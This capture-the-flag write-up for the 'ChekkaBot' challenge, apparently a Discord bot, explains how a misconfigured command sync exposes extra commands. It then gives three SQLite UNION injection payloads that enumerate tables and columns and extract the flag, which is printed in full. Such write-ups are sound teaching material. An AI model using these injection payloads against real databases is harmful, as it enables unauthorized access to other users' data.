# ChekkaBot

## Description

Check out the best bot in the world! i forgot, the admins didn't enable all the commands, only few, or did they? **Author** : Adel

## Write up
the challenge has two parts, the first part is exploiting the bad configuration made by the admins when syncing the commands, to do so we must use all commands in a private chat with the bot,

next, after testing the commands, we find the `getNote` command, it takes an id, throw a ' or * in there and we get an error, ez sqli ? but there is a small thing you need to notice first, the getNote cmd only return your notes, this is done by checking the `ur_username` column in the `notes` table, so we can't get other users notes.

1. get table names
`' union SELECT 'ur_username',1,name FROM sqlite_schema WHERE type ='table'`

2. get columns name
`' union SELECT 'ur_username',1,name FROM PRAGMA_TABLE_INFO('VeryS3cretTable');`

3. get the flag
`' union SELECT 'ur_username',1, fl4g FROM VeryS3cretTable;/*`

`AlphaCTF{D1Sc0rD_b07s_ArE_fun_JUsT_MAKE_SuRe_70_$eCur3_ThEm}`